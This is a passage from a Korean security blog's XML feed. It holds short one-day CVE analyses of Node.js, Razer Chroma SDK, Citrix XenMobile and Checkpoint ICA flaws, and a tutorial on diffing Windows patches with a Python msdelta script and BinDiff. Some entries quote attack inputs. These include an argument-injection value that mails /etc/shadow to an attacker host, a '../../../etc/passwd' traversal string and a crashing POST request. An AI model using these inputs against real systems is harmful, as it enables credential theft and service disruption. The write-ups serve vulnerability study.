두 취약점은 문자열에 <code>phar://</code> 가 아닌 <code>://</code> 가 포함될 경우 이를 필터링하는 방식으로 패치되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>unserialization</tag>
      
      <tag>arbitrary file overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8277: Node.js OOB Read를 통한 Denial of Service</title>
    <link href="/2020/11/30/idioth/2020-11-30/"/>
    <url>/2020/11/30/idioth/2020-11-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.js에서 OOB(Out of Bounds) Read를 통해 Denial of Service를 트리거할 수 있는 취약점이 발견되었습니다. 해당 취약점은 많은 양의 DNS record를 <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares 라이브러리</a>에서 TTL record를 parsing 할 때 배열 길이의 계산을 잘못하면서 일어나는 취약점입니다.</p><p>c-ares 라이브러리의 <code>ares_parse_aaaa_reply</code> 함수는 response를 포함하는 <code>char* abuffer</code>, response의 길이인 <code>alen</code>, DNS response가 반환될 구조체 포인터 <code>host</code>, TTL 배열인 <code>addrttls / naddrttls</code>를 인자로 갖습니다. <code>addrttls</code>는 반환된 TTL의 주소로 채워지는 배열이고, <code>naddrttls</code>는 반환할 TTL의 최대 값입니다. response의 reply 개수가 <code>addrttls</code> 배열보다 클 경우  <code>naddrttls</code>에서 확인 후 256개의 TTL만 처리되고 나머지 부분은 잘리게 됩니다. 하지만 취약점은 TTL의 개수에 대한 잘못된 처리가 아니라 response의 reply 개수를 잘못 계산하는 것에서 일어납니다.</p><ol><li>reply의 개수를 새서 <code>naddrs</code>에 저장</li><li>TTL 배열 작성(<code>naddrttls</code>에 의해 잘린 <code>addrttls</code>)</li><li><code>naddrttls</code> 재작성 - 실제 TTL 배열에 작성된 값보다 큰 지 확인하지 않고 <code>naddrs</code>를 집어넣음</li></ol><p>따라서 반환된 <code>naddrttls</code>가 작성된 reply의 TTL 개수보다 커지므로 OOB read가 가능하고 이를 악용하여 Denial of Service 공격을 트리거할 수 있습니다.</p><p>해당 취약점은 <code>naddrttls</code>에 <code>naddrs</code> 값을 넣을 때 <code>naddrs</code>의 값이 <code>naddrttls</code>보다 클 경우 <code>naddrttls</code> 값을 넣는 것으로 패치되었습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>dos</tag>
      
      <tag>idioth</tag>
      
      <tag>node.js</tag>
      
      <tag>oob read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 2</title>
    <link href="/2020/11/29/l0ch/windows-patch-diffing-part2/"/>
    <url>/2020/11/29/l0ch/windows-patch-diffing-part2/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요 여러분! L0ch입니다. 지난 Windows Patch Diffing글의 분량 조절 실패로 파트 1에 이어 파트 2로 돌아왔습니다! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing 맛보기 Part 1</a></p><p>업데이트 패키지 추출도 했으니 이제 진짜 패치 diffing을 시작…하기 전에! 해야 할게 한 가지 더 남아있습니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png"></p><blockquote><p>아니 그럼 diffing은 대체 언제 함?</p></blockquote><p>윈도우에서 패치를 할 때 어떤 방식으로 하는지를 먼저 알아봐야 합니다. 그래야 diffing 할 버전 별 바이너리를 생성할 수 있어요 ㅎㅎ</p><h1 id="패치-파일-유형"><a href="#패치-파일-유형" class="headerlink" title="패치 파일 유형"></a>패치 파일 유형</h1><p>이전 글에서 추출한 null, forward, reverse differential에 대해 간단하게 살펴봤었죠. 이 diff 유형의 파일들은 diffing 할 버전별 바이너리를 생성하는 데 아래와 같은 역할을 합니다.</p><ul><li><p>Forward diff</p><ul><li>기본 바이너리 (.1)를 특정 패치 수준까지 가져옵니다.</li></ul></li><li><p>Reverse diff</p><ul><li>패치가 적용된 바이너리를 기본 바이너리 (.1)로 롤백합니다.</li></ul></li><li><p>NULL diff</p><ul><li><p>패치에서 새 파일이 추가될 경우 사용됩니다.</p></br></li></ul></li></ul><p>diff 파일을 이용한 Windows의 패치 과정입니다. </p><ol><li>기존 바이너리 버전에 맞는 reverse diff 파일로 델타 패치해 기본 버전으로 롤백</li><li>패치 패키지에서 추출한 forward diff 파일로 델타 패치</li></ol><ul><li><p>NULL diff일 경우 패치할 경로에 복사</p></br></li></ul><p>우리가 diffing 할 바이너리를 구하는 과정은 다음과 같습니다.</p><ol><li><code>C:\system32\WinSxS</code> 에서 diffing 할 바이너리를 찾습니다. WinSxS에는 diff 파일뿐만 아니라 해당 버전의 바이너리도 함께 들어있습니다.</li><li>해당 버전의 reverse diff로 델타 패치해 기본 버전 바이너리로 롤백합니다.</li><li>추출한 패치 파일에서 패치할 버전의 forward diff로 델타 패치를 합니다.</li><li>패치된 바이너리의 hash를 구하고 manifest hash와 비교해 정상적으로 패치되었는지 확인합니다.</li></ol><h1 id="패치-적용"><a href="#패치-적용" class="headerlink" title="패치 적용"></a>패치 적용</h1><p><code>ntoskrnl.exe</code> 의 버전 별 바이너리를 생성해서 diffing 해보도록 하겠습니다!</p><p>diffing 대상 선정은 취약점 정보와 해당 취약점의 패치 릴리즈 버전을 보고 판단하면 되겠습니다.</p><p>powershell에서 다음 명령어를 입력하면 WinSxS에 업데이트된 버전별 differential 파일들을 확인할 수 있습니다.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? &#123;$_.Name -eq &quot;ntoskrnl.exe&quot;&#125;</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png"></p><p>환경마다 누적된 업데이트가 달라서 결과는 다를 수 있습니다.  현재 제 윈도우 시스템의 <code>ntoskrnl.exe</code> 버전인 10.0.18362.1082를 기준으로 진행해 볼게요.</p><p>현재 ntoskrnl.exe 버전 - 10.0.18362.1082</p><p>추출한 ntoskrnl.exe 버전 - 10.0.18362.1016</p><p>1082 버전은 제 시스템에 이미 있으니 1016 버전을 델타 패치로 생성해보겠습니다!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff 패치에는 ms에서 지원하는 patch API인 <code>msdelta.dll</code> 를 사용합니다.</p><p>Vista 이상 Windows에서는 <code>msdelta.dll</code> 이 기본적으로 내장되어 있기 때문에 가져다가 쓰기만 하면 되죠 ㅎㅎ</p><p>아래는 파이썬을 사용해 작성한 msdelta 패치 스크립트입니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpcStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&#x27;u1&#x27;</span>,)_fields_ = [(<span class="hljs-string">&#x27;u1&#x27;</span>, U1),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t),(<span class="hljs-string">&#x27;Editable&#x27;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&#x27;lpStart&#x27;</span>, wintypes.LPVOID),(<span class="hljs-string">&#x27;uSize&#x27;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>옵션 별 기능은 다음과 같습니다.</p><p>-i :  reverse 또는 forward differential 패치 할 바이너리 지정</p><p>-n : null differential</p><p>-o : 패치 된 결과 파일 생성</p><p>-p : 패치 diff파일 지정</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png"></p><p>1082 버전의 <code>ntoskrnl.exe</code>를 같은 버전의 reverse diff 파일로 패치해 기본 버전으로 롤백한 결과입니다.</p><p>사진과 같이 successfully applied 메시지와 hash 값이 뜨면 패치가 정상적으로 이루어진 것을 확인할 있어요.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png"></p><p>속성에서 확인해 보면 10.0.18362.1 기본 버전으로 롤백이 잘 됐네요!</p><p>이제 우리가 업데이트 패키지에서 추출한 <code>ntoskrnl</code>의 1016버전 forward diff로 패치를 해보겠습니다</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png"></p><p>버전은 1016으로 잘 올라간 것 같군요. hash도 비교해보죠.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png"></p><p>JUNK의 ntoskrnl manifest에서 참고한 hash도 일치하네요! 이로써 패치 스크립트로 정상적으로 패치 된 것을 확인할 수 있습니다.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png"></p><p>(글을 쓰고 있는 지금 내 상태)</p><p>바이너리 패치가 이렇게 힘들 일인가..? 격하게 아무것도 안하고 싶어졌지만 기왕 쓰기 시작한 거 끝은 봐야 하지 않겠습니까 으아악 빨리 끝내고 술 먹으러 가야지</p><p>마지막! diffing tool과 분석 방법입니다.</p><p>Diffing은 IDA에서 진행하며 BinDiff라는 플러그인을 사용합니다.  BinDiff는 무료로 배포되는 코드 분석 IDA 플러그인입니다. 유명한 만큼 성능 하나는 확실한 친구죠?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png"></p><p>BinDiff는 아래 링크에서 설치할 수 있습니다.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)에서 진행했습니다.</p></blockquote><p>IDA가 설치된 경로를 입력하고 설치하면 되며 정상적으로 설치가 되었다면 IDA의 Edit → Plugins에서 BinDiff를 보실 수 있습니다.</p><p>우선 1016, 1082를 각각 을 열고 Edit→Plugins→BinExport10을 실행합니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png"></p><p>그리고 BinExport v2 Binary Export로 각각 Export 해주면 준비는 끝!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png"></p><p>이제 BinDiff를 실행해서 Workspace를 만들고 Diff→New Diff에서 Export 한 두 바이너리를 선택합니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png"></p><p>Export한 파일을 선택하고 Diff하면..!</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png"></p><p>이렇게 Overview를 볼 수 있습니다. Similarity는 유사도를 나타내는데, 1에 가까울수록 차이가 없다는 뜻입니다.</p></br><p>아래로 내려보면 Similarity가 낮은 항목을 볼 수 있는데, 이 중 한 항목을 우클릭→Open Flow Graph를 실행하면</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png"></p><p>이렇게 그래프로 보여줍니다.  각 노드 색별 의미는 다음과 같습니다.</p><p>초록색 - 변경점 없음</p><p>노란색 - 변경점 있음</p><p>빨간색  - 패치에 의해 제거됨</p><p>회색 - 패치에 의해 추가됨</p><p>좀 더 자세히 볼까요? 보려는 노드를 선택해보겠습니다.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png"></p><p>이렇게 어셈블리 코드까지 볼 수 있습니다. 이런 방식으로 변경점을 트레이싱하면 어떤 부분이 패치되었는지 자세히 볼 수 있겠죠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며.."></a>마치며..</h1><p>패치 스크립트를 만들어 뒀으니 원데이 분석할 때 유용하게 쓸 수 있을 것 같네요 ㅎㅎ 이제 취약점.. 취약점만 찾으면 되는데….</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png"></p><blockquote><p>아마 안될거야..</p></blockquote><p>다음엔 다른 주제로 찾아오겠습니다. 조금만 놀구요 ㅎ (<em>망할 코로나 얼른 꺼져줬으면 ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
    <link href="/2020/11/28/fabu1ous/2020-11-28/"/>
    <url>/2020/11/28/fabu1ous/2020-11-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma는 Razer사의 게이밍용 컴퓨터 주변기기들의 RGB 효과를 제어하는 플러그인으로 Razer synapse 설치 시 자동으로 설치됩니다. SDK가 존재해서 third party가 Razer Chroma와 연동되는 기능을 만들 수 있습니다. </p><p>예 ) Razer 제품과 RGB효과를 동기화하는 케이스, 음악에 맞춰 Razer 제품의 RGB를 변화시키는 음악 스트리밍 서비스 </p><p>Razer Chroma SDK Rest server는 Razer Chroma를 사용하는 컴퓨터에서 동작하고 있으며 모든 네트워크 인터페이스와 bind 해 54236번 포트로 listen 합니다. <code>http://localhost:54235/razer/chromasdk</code> 혹은<code> https://chromasdk.io:54236/razer/chromasdk</code> URI로 App info를 담은 POST request를 받으면 그 App info에 따라 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 실행파일을 생성하고 실행합니다.</p><p>몇 가지 이슈로 인해 race-condition을 이용한 arbitrary code execution이 가능합니다.</p><ol><li><p>해커는 Razer Chroma SDK Rest server가 동작하는 컴퓨터(이하 victim)의 IP주소만 알면 원격으로 POST request를 보내 임의의 파일명을 갖는 실행파일을 victim에 생성할 수 있습니다.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST request를 받아 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>에 생성한 실행파일은 Admin권한이 있는 유저만 수정할 수 있습니다. 하지만 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더는 Admin 권한이 없어도 수정이 가능합니다.</li></ol><ol start="3"><li>POST request로 생성할 실행파일(test.exe)과 동일한 이름의 파일이 이미 <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>폴더 안에 존재하면 Razer Chroma SDK Rest server는 기존 파일의 내용을 덮어씁니다. 하지만 그 실행파일의 권한은 그 파일이 실행되기 전까진 수정하지 않으므로, 해커는 race-condition으로 test.exe의 내용을 수정해  arbitrary code execution을 할 수 있습니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>razer</tag>
      
      <tag>chroma</tag>
      
      <tag>race condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
    <link href="/2020/11/27/l0ch/2020-11-27/"/>
    <url>/2020/11/27/l0ch/2020-11-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>조직 구성원들의 모바일 디바이스 및 애플리케이션을 관리하는 Endpoint Management 솔루션인 XenMobile에서 path traversal로 권한이 없는 사용자가 패스워드를 포함한 임의 파일을 읽을 수 있고, 암호화된 패스워드를 복호화 할 수 있는 취약점이 발견되었습니다.</p><p><code>help-sb-download.jsp</code> 에 존재하는 취약한 코드는 아래와 같습니다.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>매개변수로 받는 <code>sbFileName</code>은 <code>sbFilePath</code>의 <code>/op/sas/support/</code> 뒤에 연결되고 File 클래스 생성자의 인수가 됩니다. <code>sbFileName</code>에 <code>../../../etc/passwd</code>를 전달하면 <code>/etc/passwd</code>의 내용을 출력할 수 있습니다.</p><p>이를 이용해 암호화된 패스워드의 복호화도 가능합니다. 패스워드 암호화는 <code>/opt/sas/sw/lib/libsecure.so</code> 와 <code>DataSecurity.jar</code> 라이브러리에서 이루어지며  <code>/opt/sas/rt/keys/security.properties</code>에는 암호화 키가 존재합니다. 해커가 path traversal 취약점을 악용해 라이브러리와 key를 다운로드하고 로컬 환경에서 암호화 라이브러리를 import 해 패스워드를 복호화할 수 있습니다.</p><p>이 취약점은 <code>help-sb-download.jsp</code> 파일을 제거하는 것으로 패치가 이루어졌습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary file download</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
    <link href="/2020/11/26/idioth/2020-11-26/"/>
    <url>/2020/11/26/idioth/2020-11-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management의 ICA(Internal Certificate Authority) Management Tool에서 Argument Injection과 Denial of Service 취약점이 발견되었습니다. ICA Management Tool은 기본적으로 비활성화되어있으며 <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>로 활성화할 수 있으며 설정이 활성화되면 http://<smartcenter_ip>:18265/를 통해 접근할 수 있습니다. <code>cpca_client set_mgmt_tool on -no_ssl</code>을 통해 활성화할 시 인증 없이 해당 서비스에 접근이 가능하며 Manage Certificates에 접속했을 때 관리자인지 별도의 확인을 진행하지 않습니다.</p><p>ICA Management Tool에서 메일을 보내는 프로세스인 cpca는 sendmail 바이너리를 통하여 메일을 전송합니다. sendmail은 파일 전송 기능을 지원하지만 메일을 보낼 때 누가 보내는지 확인을 하지 않으며 최고 권한으로 실행되므로 모든 파일에 접근이 가능합니다. 따라서 인자로 파일 이름을 넘겨주면 해커의 메일 서버로 파일을 전송할 수 있습니다. </p><p>해커가 netcat 등을 통해 서버를 연 후 Configure the CA의 “Management Tool mail server”에 <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>를 입력하면 해커의 메일 서버에 <code>/etc/shadow</code> 파일 내용이 메일 형식으로 날아오게 됩니다.</p><p>Denial of Service의 경우 입력 값에 대한 유효성 검사 실패로 인해 발생합니다. 원격 클라이언트가 다음과 같은 형식으로 POST request를 보낼 경우 프로그램이 종료됩니다.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dos</tag>
      
      <tag>idioth</tag>
      
      <tag>argument injection</tag>
      
      <tag>checkpoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Outlook Mail based Persistence access</title>
    <link href="/2020/11/25/fabu1ous/2020-11-25/"/>
    <url>/2020/11/25/fabu1ous/2020-11-25/</url>
    
